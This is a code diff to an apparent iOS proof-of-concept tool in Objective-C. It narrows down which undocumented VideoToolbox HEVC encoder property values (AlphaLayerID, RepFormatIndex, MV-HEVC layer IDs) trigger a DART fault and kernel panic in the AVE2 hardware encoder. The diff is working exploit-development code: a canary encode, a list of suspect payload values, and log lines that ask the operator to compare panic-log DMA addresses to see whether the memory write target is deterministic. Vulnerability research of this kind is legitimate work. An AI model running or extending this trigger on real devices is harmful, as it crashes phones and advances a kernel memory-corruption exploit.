@@ -1956,16 +1956,16 @@ static void runEscalation(void) {
 }
 
 // ============================================================
-// NARROW: Isolate which AlphaLayerID value triggers DART panic
-// Each press tests ONE value in a fresh session.
+// NARROW: Isolate DART panic trigger with canary + serialization
+// Reboot phone before running (AVE2 wedges after DART fault).
+// Each press: canary encode first, then ONE suspect value.
 // ============================================================
 
 static int g_narrowIndex = 0;
-static int g_narrowValues[] = {255, 63, 200, 128, 100, 64, 32, 62};
-static int g_narrowCount = 8;
 static volatile BOOL g_narrowGotOutput = NO;
+static volatile BOOL g_narrowRunning = NO;
 
-static void narrowOracleCallback(
+static void narrowCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
     VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
     if (status != noErr) {
@@ -1974,24 +1974,107 @@ static void narrowOracleCallback(
     }
     if (sampleBuffer) {
         g_narrowGotOutput = YES;
-        PASS(@"[Narrow] Encode callback received — frame delivered");
+        PASS(@"[Narrow] Frame delivered to callback");
         bitstreamOracle(sampleBuffer, g_oracleContext ?: @"narrow");
     }
 }
 
+typedef struct {
+    NSString *label;
+    int alphaLayerID;
+    int repFormatIndex;
+    NSArray *mvLayerIDs;
+    BOOL combined;
+} NarrowTest;
+
+static BOOL narrowEncode(NSDictionary *spec, int alphaID, int repFmtIdx,
+                          NSArray *mvIDs, BOOL combined, NSString *label) {
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"[%@] Session creation failed: %d", label, (int)status);
+        return NO;
+    }
+
+    if (alphaID >= 0) {
+        status = VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(alphaID));
+        INFO(@"[%@] SET AlphaLayerID=%d: %s", label, alphaID,
+            status == noErr ? "OK" : "REJECTED");
+    }
+
+    if (repFmtIdx >= 0) {
+        status = VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+            (__bridge CFTypeRef)@(repFmtIdx));
+        INFO(@"[%@] SET RepFormatIndex=%d: %s", label, repFmtIdx,
+            status == noErr ? "OK" : "REJECTED");
+    }
+
+    if (mvIDs) {
+        status = VTSessionSetProperty(session,
+            CFSTR("MVHEVCVideoLayerIDs"),
+            (__bridge CFTypeRef)mvIDs);
+        INFO(@"[%@] SET MVHEVCVideoLayerIDs=%@: %s", label, mvIDs,
+            status == noErr ? "OK" : "REJECTED");
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"[%@] Pixel buffer failed", label);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return NO;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = label;
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"[%@] PrepareToEncode failed: %d", label, (int)status);
+        CVPixelBufferRelease(pb);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return NO;
+    }
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"[%@] EncodeFrame: %d", label, (int)status);
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+
+    [NSThread sleepForTimeInterval:3.0];
+
+    BOOL ok = g_narrowGotOutput;
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    return ok;
+}
+
 static void runNarrowPanic(void) {
-    int val = g_narrowValues[g_narrowIndex % g_narrowCount];
-    g_narrowIndex++;
+    if (g_narrowRunning) {
+        INFO(@"Previous test still running — wait for it to finish.");
+        return;
+    }
+    g_narrowRunning = YES;
 
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════╗");
-    pocLog(@"║  NARROW: Single-Value DART Test        ║");
+    pocLog(@"║  NARROW: Isolated DART Trigger Test    ║");
+    pocLog(@"║  Canary first, then ONE suspect value  ║");
     pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***        ║");
     pocLog(@"╚══════════════════════════════════════╝");
-    pocLog(@"");
-    LOG(@"Testing AlphaLayerID = %d (test %d/%d)", val, g_narrowIndex, g_narrowCount);
-    INFO(@"If phone reboots → THIS value triggers DART fault.");
-    INFO(@"If you see 'NO PANIC' → this value is safe, press again for next.");
     pocLog(@"");
 
     NSDictionary *spec = @{
@@ -1999,78 +2082,71 @@ static void runNarrowPanic(void) {
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
     };
 
-    VTCompressionSessionRef session = NULL;
-    OSStatus status = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
-        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
-        narrowOracleCallback, NULL, &session);
-
-    if (status != noErr) {
-        FAIL(@"Session creation failed: %d", (int)status);
+    // === CANARY: baseline encode must produce output ===
+    LOG(@"--- CANARY: AlphaLayerID=0 (must produce output) ---");
+    BOOL canary = narrowEncode(spec, 0, -1, nil, NO, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 is wedged or broken.");
+        FAIL(@"Reboot phone, redeploy, try again.");
+        g_narrowRunning = NO;
         return;
     }
+    PASS(@"CANARY OK — encoder is healthy.");
+    pocLog(@"");
 
-    status = VTSessionSetProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        (__bridge CFTypeRef)@(val));
-    INFO(@"SET AlphaLayerID=%d: %s", val, status == noErr ? "OK" : "REJECTED");
+    // Suspect list — expanded beyond just AlphaLayerID
+    // Order: most likely trigger first based on sweep evidence
+    NSArray *testLabels = @[
+        @"AlphaLayerID=255",
+        @"Alpha64+RepFmt10 (combined)",
+        @"MVHEVCLayerIDs=[0,100]",
+        @"AlphaLayerID=63",
+        @"AlphaLayerID=200",
+        @"AlphaLayerID=128",
+        @"AlphaLayerID=64",
+        @"AlphaLayerID=32",
+    ];
 
-    CFTypeRef readBack = NULL;
-    VTSessionCopyProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        kCFAllocatorDefault, &readBack);
-    if (readBack) {
-        INFO(@"READBACK: %@", (__bridge id)readBack);
-        CFRelease(readBack);
+    int idx = g_narrowIndex % (int)testLabels.count;
+    g_narrowIndex++;
+    NSString *testLabel = testLabels[idx];
+
+    LOG(@"--- SUSPECT TEST %d/%d: %@ ---", idx + 1, (int)testLabels.count, testLabel);
+    INFO(@"If phone reboots after this line, '%@' is the trigger.", testLabel);
+    pocLog(@"");
+
+    BOOL survived = NO;
+    if (idx == 0) {
+        survived = narrowEncode(spec, 255, -1, nil, NO, testLabel);
+    } else if (idx == 1) {
+        survived = narrowEncode(spec, 64, 10, nil, YES, testLabel);
+    } else if (idx == 2) {
+        survived = narrowEncode(spec, -1, -1, @[@(0), @(100)], NO, testLabel);
+    } else if (idx == 3) {
+        survived = narrowEncode(spec, 63, -1, nil, NO, testLabel);
+    } else if (idx == 4) {
+        survived = narrowEncode(spec, 200, -1, nil, NO, testLabel);
+    } else if (idx == 5) {
+        survived = narrowEncode(spec, 128, -1, nil, NO, testLabel);
+    } else if (idx == 6) {
+        survived = narrowEncode(spec, 64, -1, nil, NO, testLabel);
+    } else if (idx == 7) {
+        survived = narrowEncode(spec, 32, -1, nil, NO, testLabel);
     }
 
-    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
-    if (!pb) {
-        FAIL(@"Pixel buffer failed");
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        return;
-    }
-
-    g_oracleContext = [NSString stringWithFormat:@"Narrow_%d", val];
-    status = VTCompressionSessionPrepareToEncodeFrames(session);
-    INFO(@"PrepareToEncode: %d", (int)status);
-
-    if (status != noErr) {
-        FAIL(@"PrepareToEncode failed: %d", (int)status);
-        CVPixelBufferRelease(pb);
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        return;
-    }
-
-    g_narrowGotOutput = NO;
-    INFO(@"*** ENCODING SINGLE FRAME — if phone reboots, AlphaLayerID=%d is the trigger ***", val);
-
-    status = VTCompressionSessionEncodeFrame(session, pb,
-        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"EncodeFrame: %d", (int)status);
-
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    INFO(@"CompleteFrames done");
-
-    [NSThread sleepForTimeInterval:3.0];
-
-    if (g_narrowGotOutput) {
-        PASS(@"=== AlphaLayerID=%d: SURVIVED — frame delivered, no DART fault after 3s ===", val);
+    pocLog(@"");
+    if (survived) {
+        PASS(@"=== %@: SURVIVED (frame delivered, no DART fault) ===", testLabel);
     } else {
-        FAIL(@"=== AlphaLayerID=%d: NO OUTPUT — encode silently failed (no callback) ===", val);
-        INFO(@"Session may have failed without panic — not a clean survival.");
+        FAIL(@"=== %@: NO OUTPUT (encode failed, not a clean test) ===", testLabel);
     }
 
-    int next_val = g_narrowValues[g_narrowIndex % g_narrowCount];
-    INFO(@"Next press will test AlphaLayerID=%d", next_val);
-    INFO(@"If phone crashed, save the .ips panic log — compare DVA addresses");
-    INFO(@"across crashes to check if write target is deterministic.");
+    int next_idx = g_narrowIndex % (int)testLabels.count;
+    INFO(@"Next press: %@", testLabels[next_idx]);
+    INFO(@"Save any .ips panic logs — compare DVA across crashes.");
+    pocLog(@"");
 
-    CVPixelBufferRelease(pb);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
+    g_narrowRunning = NO;
 }
 
 // ============================================================
